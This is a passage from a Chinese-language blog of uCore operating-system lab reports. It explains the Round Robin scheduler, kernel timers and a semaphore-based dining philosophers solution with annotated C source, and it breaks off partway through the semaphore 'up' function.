class="keyword">void</span> (*enqueue)(struct run_queue *rq, struct proc_struct *proc);</span><br><span class="line">    <span class="comment">// get the proc out runqueue, and this function must be called with rq_lock</span></span><br><span class="line">    <span class="keyword">void</span> (*dequeue)(struct run_queue *rq, struct proc_struct *proc);</span><br><span class="line">    <span class="comment">// choose the next runnable task</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *(*<span class="title">pick_next</span>)(<span class="keyword">struct</span> <span class="title">run_queue</span> *<span class="title">rq</span>);</span></span><br><span class="line">    <span class="comment">// dealer of the time-tick</span></span><br><span class="line">    <span class="keyword">void</span> (*proc_tick)(struct run_queue *rq, struct proc_struct *proc);</span><br><span class="line">    <span class="comment">/* for SMP support in the future</span></span><br><span class="line"><span class="comment">     *  load_balance</span></span><br><span class="line"><span class="comment">     *     void (*load_balance)(struct rq* rq);</span></span><br><span class="line"><span class="comment">     *  get some proc from this rq, used in load_balance,</span></span><br><span class="line"><span class="comment">     *  return value is the num of gotten proc</span></span><br><span class="line"><span class="comment">     *  int (*get_proc)(struct rq* rq, struct proc* procs_moved[]);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中，<code>const char *name</code>指向了当前调度算法的名称字符串</p>
<p><code>void (*init)(struct run_queue *rq)</code>用于初始化传入的就绪队列。RR 算法中只初始化了对应 run_queue 的 run_list 成员。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">RR_init(struct run_queue *rq) &#123;</span><br><span class="line">    list_init(&amp;(rq-&gt;run_list));</span><br><span class="line">    rq-&gt;proc_num = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>void (*enqueue)(struct run_queue *rq, struct proc_struct *proc)</code>用于将某个进程添加进传入的队列中。RR 算法除了将进程添加进队列中，还重置了相关的时间片。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">RR_enqueue(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">    assert(list_empty(&amp;(proc-&gt;run_link)));</span><br><span class="line">    list_add_before(&amp;(rq-&gt;run_list), &amp;(proc-&gt;run_link));</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span> || proc-&gt;time_slice &gt; rq-&gt;max_time_slice) &#123;</span><br><span class="line">        proc-&gt;time_slice = rq-&gt;max_time_slice;</span><br><span class="line">  &#125;</span><br><span class="line">    proc-&gt;rq = rq;</span><br><span class="line">    rq-&gt;proc_num ++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>void (*dequeue)(struct run_queue *rq, struct proc_struct *proc)</code>用于将某个进程从传入的队列中移除。以下是 RR 算法的实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">RR_dequeue(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">    assert(!list_empty(&amp;(proc-&gt;run_link)) &amp;&amp; proc-&gt;rq == rq);</span><br><span class="line">    list_del_init(&amp;(proc-&gt;run_link));</span><br><span class="line">    rq-&gt;proc_num --;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>struct proc_struct *(*pick_next)(struct run_queue *rq)</code>用于在传入的就绪队列中选择出一个最适合运行的进程（选择进程但不将从队列中移除）。在 RR 算法中每次都只选择队列最前面那个进程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *</span></span><br><span class="line"><span class="class"><span class="title">RR_pick_next</span>(<span class="keyword">struct</span> <span class="title">run_queue</span> *<span class="title">rq</span>) &#123;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = list_next(&amp;(rq-&gt;run_list));</span><br><span class="line">    <span class="keyword">if</span> (le != &amp;(rq-&gt;run_list)) &#123;</span><br><span class="line">        <span class="keyword">return</span> le2proc(le, run_link);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>void (*proc_tick)(struct run_queue *rq, struct proc_struct *proc)</code>。该函数会在时间中断处理例程中被调用，以减小当前运行进程的剩余时间片。若时间片耗尽，则设置当前进程的 need_resched 为 1。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">RR_proc_tick(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        proc-&gt;time_slice --;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span>) &#123;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结合 Round Robin 调度算法描 uCore 的调度执行过程</p>
<p>首先，uCore 调用 sched_init 函数用于初始化相关的就绪队列。</p>
<p>之后在 proc_init 函数中，建立第一个内核进程，并将其添加至就绪队列中。</p>
<p>当所有的初始化完成后，uCore 执行 cpu_idle 函数，并在其内部的 schedule 函数中，调用 sched_class_enqueue 将当前进程添加进就绪队列中（因为当前进程要被切换出 CPU 了）<br>然后，调用 sched_class_pick_next 获取就绪队列中可被轮换至 CPU 的进程。如果存在可用的进程，则调用 sched_class_dequeue 函数，将该进程移出就绪队列，并在之后执行 proc_run 函数进行进程上下文切换。</p>
<p>需要注意的是，每次时间中断都会调用函数 sched_class_proc_tick。该函数会减少当前运行进程的剩余时间片。如果时间片减小为 0，则设置 need_resched 为 1，并在时间中断例程完成后，在 trap 函数的剩余代码中进行进程切换。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trap</span><span class="params">(struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (current == <span class="literal">NULL</span>)</span><br><span class="line">        trap_dispatch(tf);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        struct trapframe *otf = current-&gt;tf;</span><br><span class="line">        current-&gt;tf = tf;</span><br><span class="line">        <span class="keyword">bool</span> in_kernel = trap_in_kernel(tf);</span><br><span class="line">        <span class="comment">// 执行对应的中断处理例程</span></span><br><span class="line">        trap_dispatch(tf);</span><br><span class="line">        <span class="comment">// 恢复对应的trapframe</span></span><br><span class="line">        current-&gt;tf = otf;</span><br><span class="line">        <span class="comment">// 如果当前中断的是用户进程</span></span><br><span class="line">        <span class="comment">// 注意这里体现出用户进程的可抢占性</span></span><br><span class="line">        <span class="keyword">if</span> (!in_kernel) &#123;</span><br><span class="line">            <span class="keyword">if</span> (current-&gt;flags &amp; PF_EXITING)</span><br><span class="line">                do_exit(-E_KILLED);</span><br><span class="line">            <span class="comment">// 如果在中断处理例程中设置need_resched为1，则在此处切换进程</span></span><br><span class="line">            <span class="keyword">if</span> (current-&gt;need_resched)</span><br><span class="line">                schedule();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/24/Lab7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lagrange">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lagrange's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/24/Lab7/" class="post-title-link" itemprop="url">Lab7 实验报告</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-01-24 10:47:34" itemprop="dateCreated datePublished" datetime="2021-01-24T10:47:34Z">2021-01-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-23 00:29:15" itemprop="dateModified" datetime="2021-04-23T00:29:15Z">2021-04-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OS/" itemprop="url" rel="index"><span itemprop="name">OS</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Lab7"><a href="#Lab7" class="headerlink" title="Lab7"></a>Lab7</h1><h2 id="定时器-Timer"><a href="#定时器-Timer" class="headerlink" title="定时器 Timer"></a>定时器 Timer</h2><p>timer_t 结构用于存储一个定时器所需要的相关数据，包括倒计时时间以及所绑定的进程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">list_entry_t</span> timer_list;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> expires;       <span class="comment">//the expire time</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span>   <span class="comment">//the proc wait in this timer. If the expire time is end, then this proc will be scheduled</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> timer_link;    <span class="comment">//the timer list</span></span><br><span class="line">&#125; <span class="keyword">timer_t</span>;</span><br></pre></td></tr></table></figure>
<p>add_timer 用于将某个 timer 添加进 timer 列表中。</p>
<p>处于性能考虑，每个新添加的 timer 都会按照其 expires 属性的大小排列，同时减去上一个 timer 的 expires 属性。一个例子：</p>
<p>两个尚未添加进列表中的 timer:</p>
<p>timer1-&gt;expires = 20;<br>timer2-&gt;expires = 38;</p>
<p>将这两个 timer 添加进列表后:（注意 timer2 的 expires）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+------------+       +----------------------+       +--------------------------+</span><br><span class="line">| timer_list | &lt;---&gt; | timer1-&gt;expires &#x3D; 20 | &lt;---&gt; | timer2-&gt;expires &#x3D; 18 !!! |</span><br><span class="line">+------------+       +----------------------+       +--------------------------+</span><br></pre></td></tr></table></figure>
<p>这样，在更新 timer_list 中的所有 timer 的 expires 时，只需递减链首的第一个 timer 的 expire，即可间接达到所有 timer 的 expires 减一的目的。</p>
<p>该函数源代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// add timer to timer_list</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_timer</span><span class="params">(<span class="keyword">timer_t</span> *timer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">list_entry_t</span> *le = list_next(&amp;timer_list);</span><br><span class="line">        <span class="comment">// 减去每个遍历到的timer的expires</span></span><br><span class="line">        <span class="keyword">while</span> (le != &amp;timer_list) &#123;</span><br><span class="line">            <span class="keyword">timer_t</span> *next = le2timer(le, timer_link);</span><br><span class="line">            <span class="keyword">if</span> (timer-&gt;expires &lt; next-&gt;expires) &#123;</span><br><span class="line">                next-&gt;expires -= timer-&gt;expires;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            timer-&gt;expires -= next-&gt;expires;</span><br><span class="line">            le = list_next(le);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将当前timer添加至列表中</span></span><br><span class="line">        list_add_before(le, &amp;(timer-&gt;timer_link));</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>run_timer_list 函数用于更新定时器的时间，并更新当前进程的运行时间片。如果当前定时器的剩余时间结束，则唤醒某个处于 WT_INTERRUPTED 等待状态的进程。有一点在上个函数中提到过：递减 timer_list 中每个 timer 的 expires 时，只递减链头第一个 timer 的 expires。该函数的源代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// call scheduler to update tick related info, and check the timer is  expired? If expired, then wakup proc</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run_timer_list</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">list_entry_t</span> *le = list_next(&amp;timer_list);</span><br><span class="line">        <span class="keyword">if</span> (le != &amp;timer_list) &#123;</span><br><span class="line">            <span class="keyword">timer_t</span> *timer = le2timer(le, timer_link);</span><br><span class="line">            <span class="comment">// 只递减链头timer的expires</span></span><br><span class="line">            timer-&gt;expires --;</span><br><span class="line">            <span class="keyword">while</span> (timer-&gt;expires == <span class="number">0</span>) &#123;</span><br><span class="line">                le = list_next(le);</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> =</span> timer-&gt;proc;</span><br><span class="line">                wakeup_proc(proc);</span><br><span class="line">                del_timer(timer);</span><br><span class="line">                <span class="keyword">if</span> (le == &amp;timer_list)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                timer = le2timer(le, timer_link);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 当前进程执行时间减 1</span></span><br><span class="line">        sched_class_proc_tick(current);</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将 timer 从 timer_list 中删除的操作比较简单：设置好当前待移除 timer 的下一个 timer-&gt;expires，并将当前 timer 从链表中移除即可。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// del timer from timer_list</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_timer</span><span class="params">(<span class="keyword">timer_t</span> *timer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!list_empty(&amp;(timer-&gt;timer_link))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (timer-&gt;expires != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">list_entry_t</span> *le = list_next(&amp;(timer-&gt;timer_link));</span><br><span class="line">                <span class="keyword">if</span> (le != &amp;timer_list) &#123;</span><br><span class="line">                    <span class="keyword">timer_t</span> *next = le2timer(le, timer_link);</span><br><span class="line">                    next-&gt;expires += timer-&gt;expires;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            list_del_init(&amp;(timer-&gt;timer_link));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个简单的例子，do_sleep 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_sleep</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> time)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (time == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 设置定时器</span></span><br><span class="line">        <span class="keyword">timer_t</span> __timer, *timer = timer_init(&amp;__timer, current, time);</span><br><span class="line">        current-&gt;state = PROC_SLEEPING;</span><br><span class="line">        current-&gt;wait_state = WT_TIMER;</span><br><span class="line">        <span class="comment">// 启用定时器</span></span><br><span class="line">        add_timer(timer);</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    <span class="comment">// 当前进程放弃CPU资源</span></span><br><span class="line">    schedule();</span><br><span class="line">    <span class="comment">// 时间到点了，删除当前timer</span></span><br><span class="line">    del_timer(timer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>定时器的用处：定时器可以帮助操作系统在经过一段特定时间后执行一些特殊操作，例如唤醒执行线程。可以说，正是有了定时器，操作系统才有了时间这个概念。</p>
<h2 id="内核信号量实现"><a href="#内核信号量实现" class="headerlink" title="内核信号量实现"></a>内核信号量实现</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pid = kernel_thread(init_main, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">init_main(<span class="keyword">void</span> *arg) &#123;</span><br><span class="line">    ...</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">check_sync</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">    check_sync();                <span class="comment">// check philosopher sync problem</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (do_wait(<span class="number">0</span>, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">        schedule();</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_sync</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//check semaphore</span></span><br><span class="line">    sem_init(&amp;mutex, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        sem_init(&amp;s[i], <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> pid = kernel_thread(philosopher_using_semaphore, (<span class="keyword">void</span> *)i, <span class="number">0</span>);</span><br><span class="line">        philosopher_proc_sema[i] = find_proc(pid);</span><br><span class="line">        set_proc_name(philosopher_proc_sema[i], <span class="string">&quot;philosopher_sema_proc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在第一个内核进程 idleproc 调用 kernel_thread 派生出第二个进程 init 执行 init_main 函数，init_main 函数调用 check_sync 创建了五个哲学家进程，此时进程控制权还在 init 手中，之后 init 执行 do_wait，主动放弃时间片，执行 schedule()，五个哲学家开始活动。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">philosopher_using_semaphore</span><span class="params">(<span class="keyword">void</span> * arg)</span> <span class="comment">/* i：哲学家号码，从0到N-1 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, iter=<span class="number">0</span>;</span><br><span class="line">    i=(<span class="keyword">int</span>)arg;</span><br><span class="line">    cprintf(<span class="string">&quot;I am No.%d philosopher_sema\n&quot;</span>,i);</span><br><span class="line">    <span class="keyword">while</span>(iter++&lt;TIMES)</span><br><span class="line">    &#123; <span class="comment">/* 无限循环 */</span></span><br><span class="line">        cprintf(<span class="string">&quot;Iter %d, No.%d philosopher_sema is thinking\n&quot;</span>,iter,i); <span class="comment">/* 哲学家正在思考 */</span></span><br><span class="line">        do_sleep(SLEEP_TIME);</span><br><span class="line">        phi_take_forks_sema(i);</span><br><span class="line">        <span class="comment">/* 需要两只叉子，或者阻塞 */</span></span><br><span class="line">        cprintf(<span class="string">&quot;Iter %d, No.%d philosopher_sema is eating\n&quot;</span>,iter,i); <span class="comment">/* 进餐 */</span></span><br><span class="line">        do_sleep(SLEEP_TIME);</span><br><span class="line">        phi_put_forks_sema(i);</span><br><span class="line">        <span class="comment">/* 把两把叉子同时放回桌子 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    cprintf(<span class="string">&quot;No.%d philosopher_sema quit\n&quot;</span>,i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_take_forks_sema</span><span class="params">(<span class="keyword">int</span> i)</span> <span class="comment">/* i：哲学家号码从0到N-1 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        down(&amp;mutex); <span class="comment">/* 进入临界区 */</span></span><br><span class="line">        state_sema[i]=HUNGRY; <span class="comment">/* 记录下哲学家i饥饿的事实 */</span></span><br><span class="line">        phi_test_sema(i); <span class="comment">/* 试图得到两只叉子 */</span></span><br><span class="line">        up(&amp;mutex); <span class="comment">/* 离开临界区 */</span></span><br><span class="line">        down(&amp;s[i]); <span class="comment">/* 如果得不到叉子就阻塞 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_put_forks_sema</span><span class="params">(<span class="keyword">int</span> i)</span> <span class="comment">/* i：哲学家号码从0到N-1 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        down(&amp;mutex); <span class="comment">/* 进入临界区 */</span></span><br><span class="line">        state_sema[i]=THINKING; <span class="comment">/* 哲学家进餐结束 */</span></span><br><span class="line">        phi_test_sema(LEFT); <span class="comment">/* 看一下左邻居现在是否能进餐 */</span></span><br><span class="line">        phi_test_sema(RIGHT); <span class="comment">/* 看一下右邻居现在是否能进餐 */</span></span><br><span class="line">        up(&amp;mutex); <span class="comment">/* 离开临界区 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面是哲学家就餐问题的解，但本文主要聚焦于内核信号量的实现，即 sem_init，up，down 这三个函数的实现。</p>
<h3 id="sem-init"><a href="#sem-init" class="headerlink" title="sem_init"></a>sem_init</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="keyword">wait_queue_t</span> wait_queue;</span><br><span class="line">&#125; <span class="keyword">semaphore_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">sem_init(<span class="keyword">semaphore_t</span> *sem, <span class="keyword">int</span> value) &#123;</span><br><span class="line">    sem-&gt;value = value;</span><br><span class="line">    wait_queue_init(&amp;(sem-&gt;wait_queue));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sem_init 函数初始化了一个等待队列以及信号量的初值。</p>
<h3 id="up"><a href="#up" class="headerlink" title="up"></a>up</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 